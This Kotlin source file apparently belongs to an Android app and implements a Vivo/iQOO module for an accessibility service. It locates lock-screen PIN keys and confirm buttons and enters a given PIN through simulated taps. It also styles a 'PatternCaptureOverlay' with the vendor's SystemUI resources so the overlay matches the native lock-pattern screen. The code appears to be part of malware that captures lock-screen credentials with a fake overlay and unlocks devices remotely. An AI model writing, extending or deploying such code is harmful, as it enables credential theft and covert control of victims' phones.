package com.storm.safe.rock.service.modules.cipher.vendor

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.content.res.Resources
import android.graphics.PointF
import android.graphics.Rect
import android.util.Log
import android.view.accessibility.AccessibilityNodeInfo
import com.storm.safe.rock.service.modules.cipher.PatternLockView

/**
 * Vivo / iQOO cipher strategy.
 *
 * Extracted from CipherCaptureManager brand branches:
 * - clickConfirmButtonFull: 4 Vivo confirm button IDs
 * - tryKeyNodeInputFull: four_to_more_key pattern
 * - tryConfirmLock: raw coordinates (no transform)
 * - isInConfirmLockScreen: Vivo-specific ConfirmLock IDs
 * - PatternCaptureOverlay: Vivo fallback style + resource reading
 */
class VivoCipherStrategy : CipherBrandStrategy() {

    override val tag = "VivoCipher"

    /**
     * Vivo confirm buttons: mix_confirm, iv_complete, vivo_pin_confirm, mix_normal_confirm.
     * vendor: clickConfirmButtonFull Vivo branch
     */
    override fun clickBrandConfirmButton(
        root: AccessibilityNodeInfo,
        pkg: String,
        basePkg: String,
        findById: (AccessibilityNodeInfo, String) -> AccessibilityNodeInfo?,
        findByIdAndClass: (AccessibilityNodeInfo, String, String) -> AccessibilityNodeInfo?
    ): Boolean {
        val buttons = listOf(
            Pair("$basePkg:id/mix_confirm", "android.view.View"),
            Pair("$basePkg:id/iv_complete", "android.widget.TextView"),
            Pair("$basePkg:id/vivo_pin_confirm", "android.widget.Button"),
            Pair("$basePkg:id/mix_normal_confirm", "android.widget.TextView")
        )
        for ((id, cls) in buttons) {
            val node = findByIdAndClass(root, id, cls) ?: findById(root, id)
            if (node != null && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                Log.d(tag, "Clicked Vivo confirm: $id")
                return true
            }
            // Fallback to com.android.settings if basePkg differs
            if (basePkg != "com.android.settings") {
                val altId = id.replace(basePkg, "com.android.settings")
                val altNode = findByIdAndClass(root, altId, cls) ?: findById(root, altId)
                if (altNode != null && altNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                    Log.d(tag, "Clicked Vivo confirm (fallback): $altId")
                    return true
                }
            }
        }
        return false
    }

    /**
     * Vivo PIN input via four_to_more_key pattern.
     * vendor: tryKeyNodeInputFull Vivo branch
     */
    override fun inputPinViaKeyNodes(
        root: AccessibilityNodeInfo,
        pin: String,
        basePkg: String,
        isSystemUi: Boolean,
        service: AccessibilityService,
        findById: (AccessibilityNodeInfo, String) -> AccessibilityNodeInfo?,
        findByContentDesc: (AccessibilityNodeInfo, String) -> AccessibilityNodeInfo?,
        clickConfirm: () -> Unit,
        sleep200: () -> Unit,
        sleep500: () -> Unit
    ): Boolean {
        var cr = service.rootInActiveWindow ?: root
        var any = false
        for (ch in pin) {
            val node = findById(cr, "$basePkg:id/four_to_more_key$ch")
            if (node != null && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                if (isSystemUi) sleep200() else sleep500()
                any = true
            }
            try { cr.refresh() } catch (_: Exception) {}
        }
        if (any) {
            clickConfirm()
            return true
        }
        return false
    }

    /**
     * Vivo uses raw coordinates (no transform).
     * vendor: tryConfirmLock Vivo branch
     */
    override fun resolvePatternGesturePoints(
        dedupedPoints: java.util.LinkedList<android.graphics.Point>,
        patternNode: AccessibilityNodeInfo,
        boundsInScreen: Rect?,
        boundsInParent: Rect?,
        transformFn: (java.util.LinkedList<android.graphics.Point>, Rect, Rect, Rect, Rect) -> List<android.graphics.Point>
    ): ArrayList<PointF>? {
        // Vivo: always use raw coordinates regardless of bounds availability
        val result = ArrayList<PointF>()
        for (p in dedupedPoints) {
            result.add(PointF(p.x.toFloat(), p.y.toFloat()))
        }
        return result
    }

    /**
     * Vivo-specific ConfirmLock detection IDs.
     * vendor: isInConfirmLockScreen Vivo IDs
     */
    override fun extraConfirmLockIds(pkg: String): List<String> = listOf(
        "$pkg:id/vivo_pin_confirm",
        "$pkg:id/mix_confirm",
        "$pkg:id/iv_complete",
        "$pkg:id/mix_normal_confirm"
    )

    /**
     * Vivo fallback pattern style.
     * vendor: PatternCaptureOverlay Vivo branch
     * Colors: light gray -3355444, yellow selected -256
     */
    override fun applyPatternFallbackStyle(view: PatternLockView, themeColor: Int, density: Float) {
        view.normalStateColor = -3355444       // light gray
        view.correctStateColor = -3355444
        view.dotNormalSize = 20
        view.dotSelectedSize = 40
        view.dotSelectedColor = -256           // yellow (#FFFFFF00)
        view.pathWidth = 30
        view.pathColor = -0x009701             // #FFF68F (khaki/yellow)
        view.aspectRatio = 0
        view.dotAnimationDuration = 150
        view.pathEndAnimationDuration = 100
    }

    /**
     * Vivo resource reading: 4-level fallback.
     * vivo_select_point -> vivo_spring_patten -> vivo_unlock_size -> hardcoded
     * Plus vivo color resources.
     * vendor: PatternCaptureOverlay Vivo resource branch
     */
    override fun readBrandResources(res: Resources, suiContext: Context, density: Float): BrandResourceResult? {
        // Attempt vivo-specific dimen resources
        val dimenNames = listOf(
            "vivo_select_point_size",
            "vivo_spring_patten_size",
            "vivo_unlock_size"
        )
        var dotSize = 0
        for (name in dimenNames) {
            val id = res.getIdentifier(name, "dimen", "com.android.systemui")
            if (id != 0) {
                dotSize = res.getDimensionPixelSize(id)
                if (dotSize > 0) break
            }
        }
        // Fallback to AOSP
        if (dotSize <= 0) {
            val aospId = res.getIdentifier("lock_pattern_dot_size", "dimen", "com.android.systemui")
            if (aospId != 0) dotSize = res.getDimensionPixelSize(aospId)
        }
        if (dotSize <= 0) return null

        // Vivo color resources
        var dotColor = 0
        var pathColor = 0
        for (name in listOf("vivo_lock_pattern_dot_color", "vivo_pattern_dot_color")) {
            val id = res.getIdentifier(name, "color", "com.android.systemui")
            if (id != 0) {
                dotColor = res.getColor(id, suiContext.theme)
                break
            }
        }
        for (name in listOf("vivo_lock_pattern_path_color", "vivo_pattern_path_color")) {
            val id = res.getIdentifier(name, "color", "com.android.systemui")
            if (id != 0) {
                pathColor = res.getColor(id, suiContext.theme)
                break
            }
        }

        return BrandResourceResult(
            haloSize = dotSize * 3,
            innerDotSize = dotSize,
            pathWidth = 0,
            dotColor = dotColor,
            pathColor = pathColor
        )
    }

    override fun animationDurations(): Pair<Int, Int> = Pair(150, 100)
}
